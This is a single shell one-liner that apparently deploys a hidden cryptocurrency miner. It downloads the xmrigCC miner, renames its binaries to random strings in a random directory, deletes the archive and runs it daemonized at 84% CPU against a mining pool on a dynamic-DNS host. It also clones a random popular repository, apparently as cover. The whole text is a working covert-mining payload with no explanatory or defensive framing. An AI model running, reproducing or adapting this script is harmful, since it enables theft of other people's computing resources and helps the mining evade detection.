yum install htop wget snapd -y && sudo systemctl enable --now snapd.socket && sudo ln -s /var/lib/snapd/snap /snap && PoolURL="ipv4tracking.ddnsfree.com:18587" && RIGNAME=c41_$(hostname) && sudo snap install jq && randomgiturl=$(curl -s 'https://randomrepo.com/api/repos/search?stars=1000' | jq -r '.html_url') && git clone $randomgiturl && mv */* . 2>/dev/null; true && MYDir=$(cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-3} | head -n 1) && MYRname=$(cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-2} | head -n 1) && MyblankName=$(cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-4} | head -n 1)  && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.2/xmrigCC-miner_only-3.3.2-linux-generic-static-amd64.tar.gz && mkdir -p $MYDir && tar -xf xmrigCC-miner_only-3.3.2-linux-generic-static-amd64.tar.gz -C $MYDir && mv $MYDir/xmrigDaemon $MYDir/$MyblankName && mv $MYDir/xmrigMiner $MYDir/$MYRname && rm -rf xmrigCC-miner_only-3.3.2-linux-generic-static-amd64.tar.gz && ./$MYDir/$MYRname --daemonized --url $PoolURL --user $RIGNAME --pass $RIGNAME --cpu-max-cpu-usage 84 --donate-level 1 -B && htop